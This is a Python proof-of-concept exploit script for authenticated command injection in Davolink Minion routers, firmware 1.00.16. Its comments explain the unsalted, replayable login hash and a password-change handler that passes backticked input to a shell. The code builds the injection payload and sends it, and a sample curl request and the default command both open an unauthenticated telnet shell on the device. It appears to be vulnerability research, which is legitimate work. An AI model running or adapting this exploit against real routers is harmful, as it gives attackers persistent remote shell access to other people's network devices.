#!/usr/bin/python3

import argparse
import binascii
import json
import requests

from hashlib import sha256

description = """
Authenticated remote command execution for the Davolink Minion router series.
Tested on firmware version 1.00.16.
"""

class colors:
    darkblue = "\033[38;5;18m"
    mediumblue = "\033[38;5;20m"
    lightblue = "\033[38;5;39m"
    darkorange = "\033[38;5;130m"
    mediumorange = "\033[38;5;208m"
    lightorange  = "\033[38;5;214m"
    green = "\033[38;5;34m"
    yellow = "\033[38;5;226m"
    cyan = "\033[38;5;51m"
    red = "\033[38;5;196m"
    reset = "\033[0m"
    # Thanks, ChatGPT!

poc = r"""
         _          _             _ 
        /\ \       /\ \         /\ \ 
       /  \ \     /  \ \       /  \ \ 
      / /\ \ \   / /\ \ \     / /\ \ \ 
     / / /\ \_\ / / /\ \ \   / / /\ \ \ 
    / / /_/ / // / /  \ \_\ / / /  \ \_\ 
   / / /__\/ // / /   / / // / /    \/_/ 
  / / /_____// / /   / / // / /
 / / /      / / /___/ / // / /________ 
/ / /      / / /____\/ // / /_________\ 
\/_/       \/_________/ \/____________/ 

"""

headers = dict()
headers["Connection"] = "keep-alive"
headers["Upgrade-Insecure-Requests"] = "1"
headers["User-Agent"] = "Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Raspbian Chromium/78.0.3904.108 Chrome/78.0.3904.108 Safari/537.36"
headers["Sec-Fetch-User"] = "?1"
headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"
headers["Sec-Fetch-Site"] = "none"
headers["Sec-Fetch-Mode"] = "navigate"
headers["Accept-Encoding"] = "gzip, deflate, br"
headers["Accept-Language"] = "en-US,en;q=0.9"
headers["Content-Type"] = "application/json"

'''
While this device does support TLS, it has been observed to use the same key
for all deployments, providing limited protection. As an upgrade to the
password being protected by obfuscation-by-encryption, modern firmware for the
"Minion" routers now send a request directly to /auth/login containing a JSON
payload with a key, "pw", whose value is the SHA256 hash of the concatenation
of the username, a colon, and the submitted password:
{
    "id":"bob",
    "password":"973ca65033eaac19dcb1c9d9057d45c84bd6db13a24d314aebc379ec9ca5982b",
    "captcha_code":""
}
("captcha_code" can be empty and is only required after five failed logon
attempts). Also, note that this provides only marginal security as the password
string contains no challenge or salt, and therefore can be replayed
effortlessly for logon tokens if captured.

If successful, the server responds with a JSON payload containing a JWT. For a
live example:
{
    "status": 200,
    "detail": "success",
    "data":
    {
        "user_id": "bob",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZGRyIjoiNjA6Mjk6RDU6ODU6NTc6QTAiLCJleHAiOjM3OTUsImlhdCI6MzE5NSwiaXNzIjoiZGF2b2xpbmsuY28ua3IiLCJwZXJtaXNzaW9uIjowLCJzdWIiOiJ3ZWIiLCJ1c2VyIjoiYm9iIn0.ulvVxgAn1rPQvb4ZJsOj1P9lOJe1-QuXH4jwOdNQUFs", "refresh_token": "646d716c29a36386d16badd37708838d582ece0595b0becab9340645e3b264da"
    }
}
This Bearer token will be required to communicate with all /api/ endpoints.
'''
def send_login(address, port, username, password, ssl, captcha_code = ""):
    '''
    Obtains an access JWT given valid login credentials.

    Keyword Arguments:
    address      -- the IP address of the remote Minion target
    port         -- the port of the target's administrative web console
    username     -- the username to use in the login challenge
    password     -- the password to use in the login challenge
    ssl          -- true if requests are to use SSL (or port 8443)
    captcha_code -- the captcha_code (if necessary; defaults to empty)

    Returns:
    access JWT (success)
    exception/exit (failure)
    '''

    pwstring = sha256((username + ":" + password).encode("ascii")).hexdigest()

    login_body = dict()
    login_body["id"] = username
    login_body["password"] = pwstring
    login_body["captcha_code"] = captcha_code

    try:
        if ssl:
            login_attempt = requests.post(
                "https://" + address + ":" + port + "/auth/login",
                headers = headers,
                verify = False,
                json = login_body)
        else:
            login_attempt = requests.post(
                "http://" + address + ":" + port + "/auth/login",
                headers = headers,
                json = login_body)

        if login_attempt.content == "login_fail":
            print("Incorrect username and/or password")
            exit(1)

        login_parameters = json.loads(login_attempt.content)

        return login_parameters["data"]["token"]

    except Exception as e:
        print("Something went wrong: %s" % (str(e)))


'''
The bug that gets exploited is in the /api/status/account endpoint that occurs
when trying to update account passwords. Because it is behind /api/ it
requires a valid session JWT to access, which can be obtained either by
logging in legitimately or by sniffing one from a logged-in session and undoing
the SSL if necessary.

The endpoint's handler, patch_system_account_callback, first parses the PATCH
request's JSON body and ensure that the keys "id", "pw", "chid", "chpw", and
"repw" (the incoming password and its typed repeat). After verifying that the
values of the "chpw" and "repw" are the same, handler_account_set is called,
which checks that the "id" and "pw" correspond to a valid user (FUN_00447c04).
If valid, a function is called to do the actual update (FUN_00447a20). Without
any further validation, the following call is made:

dvs_call('echo "%s" > /tmp/pwd && /bin/dvpw "%s" "%s" /tmp/pwd',
    "chpw",
    "id",
    "chid"
)

This means that supplying a password of the form: 'x\" <command> #' in the
"chpw" (password-to-be-changed-to) parameter will place <command> on the
command line. Opening telnet is a stable way of maintaining command access to
the device and was the go-to used in testing: 'x\"/bin/telnetd -l /bin/sh #'.
An example curl command that does the whole thing is:

curl -XPATCH 'http://172.20.1.1/api/system/handler' --header 'authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZGRyIjoiNjA6Mjk6RDU6ODU6NTc6QTAiLCJleHAiOjE2NDY1LCJpYXQiOjE1ODY1LCJpc3MiOiJkYXZvbGluay5jby5rciIsInBlcm1pc3Npb24iOjAsInN1YiI6IndlYiIsInVzZXIiOiJib2IifQ.9VvB9FrdN8ri-6T1bGpVSbOaVdE9XtfQ85wi6t8ZGyo' --data
'
{
    "id":"bob",
    "pw":"973ca65033eaac19dcb1c9d9057d45c84bd6db13a24d314aebc379ec9ca5982b",
    "chid":"bob",
    "chpw":"`/bin/telnetd -l /bin/sh`bobspassword",
    "repw":"`/bin/telnetd -l /bin/sh`bobspassword
}
'
Note that this exploits a PATCH handler, not a POST handler, and actually does
change the password to user "bob". As this exploit is post-authentication, it
is assumes that the given user's password is known, and resets it (and their
username) to what they were to avoid destructive outcomes.

Note that if the command that is run has output then it will change the user's
password to the output of that command, followed by the original password!
/bin/telnetd -l /bin/sh is known to not have output; using 2>$1 >/dev/null is
also acceptable.
'''
def send_exploit(address, port, token, username, password, command, ssl):
    '''
    Runs an arbitrary command on a remote device when given valid credentials.

    Keyword Arguments:
    address  -- the IP address of the remote Minion target
    port     -- the port of the target's administrative web console
    token    -- a valid session JSON Web Token
    username -- the username of a valid user
    password -- the password for the user named above
    command  -- the command to be run on target
    ssl      -- true if requests are to use SSL (or port 8443)

    Returns:
    nothing (except the attacker's command being run on success)
    '''

    headers["authorization"] = token

    pwstring = sha256((username + ":" + password).encode("ascii")).hexdigest()

    payload = dict()
    payload["id"] = username
    payload["pw"] = pwstring
    payload["chid"] = username
    payload["chpw"] = '`' + command + '`' + password
    payload["repw"] = '`' + command + '`' + password

    try:
        if ssl:
            exploit_request = requests.patch(
                "https://" + address + ":" + port + "/api/system/account",
                headers = headers,
                verify = False,
                json = payload)

        else:
            exploit_request = requests.patch(
                "http://" + address + ":" + port + "/api/system/account",
                headers = headers,
                json = payload)

        result = exploit_request.status_code

        if result == 200:
            print("Got a 200- should have worked!")
            exit(0)
        else:
            print("Got a " + str(result) + ". Something went wrong.")
            exit(2)

    except Exception as e:
        print("Something went wrong: %s" % (str(e)))

def main():

    parser = argparse.ArgumentParser(
        description = "Run commands post-authentication",
        formatter_class=argparse.RawTextHelpFormatter,
    )

    parser.add_argument(
        "-a",
        "--address",
        required = True,
        help = "IP address of target 'bob' or 'kevin'")
    parser.add_argument(
        "-o",
        "--port",
        default = 8000,
        help = "Port the remote web server is found on (default: 80)")
    parser.add_argument(
        "-u",
        "--username",
        required = True,
        default = "bob",
        help = "Login username (default = bob)")
    parser.add_argument(
        "-p",
        "--password",
        required = True,
        help = "Device login password")
    parser.add_argument(
        "-s",
        "--ssl",
        action = "store_true",
        help = "Use SSL when making requests (default: false)")
    parser.add_argument(
        "-c",
        "--command",
        required = True,
        default = "/bin/telnetd -p 2323 -l /bin/sh",
        help = "Command to run (default opens unauthenticated telnet on 2323)")
    parser.add_argument(
        "-v",
        "--verbose",
        action = "store_true",
        help = "increase output verbosity (currently not implemented)")

    args = parser.parse_args()

    address = args.address
    port = args.port
    username = args.username
    password = args.password
    ssl = args.ssl
    command = args.command
    verbose = args.verbose

    token = send_login(address, port, username, password, ssl)

    send_exploit(address, port, token, username, password, command, ssl)

if __name__ == "__main__":
    main()
